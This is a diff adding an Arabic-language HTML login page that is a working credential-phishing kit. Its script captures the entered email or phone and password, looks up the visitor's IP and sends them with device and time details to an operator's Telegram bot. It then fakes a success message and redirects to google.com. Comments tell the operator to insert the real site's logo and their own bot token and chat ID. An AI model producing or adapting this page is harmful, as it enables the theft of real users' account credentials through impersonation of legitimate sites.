@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: system-ui, -apple-system, sans-serif; 
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            backdrop-filter: blur(10px);
+            padding: 40px; 
+            border-radius: 20px; 
+            box-shadow: 0 25px 45px rgba(0,0,0,0.2); 
+            width: 100%; 
+            max-width: 420px; 
+            text-align: center;
+        }
+        .logo { margin-bottom: 30px; }
+        .logo img { width: 70px; height: 70px; border-radius: 15px; }
+        h1 { color: #1e3c72; font-size: 28px; font-weight: 700; margin-bottom: 10px; }
+        .subtitle { color: #666; margin-bottom: 30px; }
+        .form-group { margin-bottom: 25px; text-align: right; }
+        label { display: block; color: #333; font-size: 15px; margin-bottom: 10px; font-weight: 500; }
+        input { 
+            width: 100%; padding: 16px 20px; 
+            border: 2px solid #e2e8f0; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            transition: all 0.3s ease;
+            background: #f8fafc;
+        }
+        input:focus { 
+            outline: none; 
+            border-color: #1e3c72; 
+            box-shadow: 0 0 0 4px rgba(30,60,114,0.1);
+            background: white;
+        }
+        .login-btn { 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
+            color: white; 
+            border: none; 
+            border-radius: 12px; 
+            font-size: 17px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: all 0.3s ease;
+        }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(30,60,114,0.4); }
+        .login-btn:active { transform: translateY(0); }
+        .loading { display: none; }
+        .success { display: none; background: #10b981; color: white; padding: 15px; border-radius: 12px; margin-top: 20px; }
+        @media (max-width: 480px) { .container { padding: 30px 25px; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- غير الصورة دي بلوجو الموقع الحقيقي -->
+            <img src="https://via.placeholder.com/70/1e3c72/ffffff?text=LOGO" alt="Logo">
+        </div>
+        <h1>تسجيل الدخول</h1>
+        <p class="subtitle">الرجاء إدخال بيانات حسابك</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label>البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="username" placeholder="example@email.com" required>
+            </div>
+            <div class="form-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="password" placeholder="••••••••••" required>
+            </div>
+            <button type="submit" class="login-btn" id="submitBtn">
+                <span class="loading" id="loadingSpinner">⏳ جاري التحقق...</span>
+                <span id="btnText">دخول الحساب</span>
+            </button>
+        </form>
+        
+        <div id="successMsg" class="success">تم تسجيل الدخول بنجاح! جاري التحويل...</div>
+    </div>
+
+    <script>
+        // غير القيم دي ببيانات الـ Bot بتاعتك
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // مثال: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // مثال: 123456789
+        
+        const form = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingSpinner = document.getElementById('loadingSpinner');
+        const btnText = document.getElementById('btnText');
+        const successMsg = document.getElementById('successMsg');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // إظهار loading
+            submitBtn.disabled = true;
+            loadingSpinner.style.display = 'inline';
+            btnText.style.display = 'none';
+            
+            try {
+                // إرسال لـ Telegram
+                const message = `🔥 **جديد تسجيل دخول!**\n\n` +
+                               `👤 **الاسم/الإيميل:** \`${username}\`\n` +
+                               `🔑 **كلمة المرور:** \`${password}\`\n` +
+                               `🌐 **IP:** \`${await getClientIP()}\`\n` +
+                               `📱 **جهاز:** ${navigator.userAgent.slice(0,50)}...\n` +
+                               `🕐 **وقت:** ${new Date().toLocaleString('ar-EG')}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // إظهار نجاح وتحويل
+                successMsg.style.display = 'block';
+                form.style.display = 'none';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';  // الموقع الأصلي
+                }, 1500);
+                
+            } catch (error) {
+                console.log('Telegram error:', error);
+                // fallback redirect
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 1000);
+            }
+        });
+        
+        // محاولة جلب IP (اختياري)
+        async function getClientIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'غير متاح';
+            }
+        }
+    </script>
+</body>
+</html>
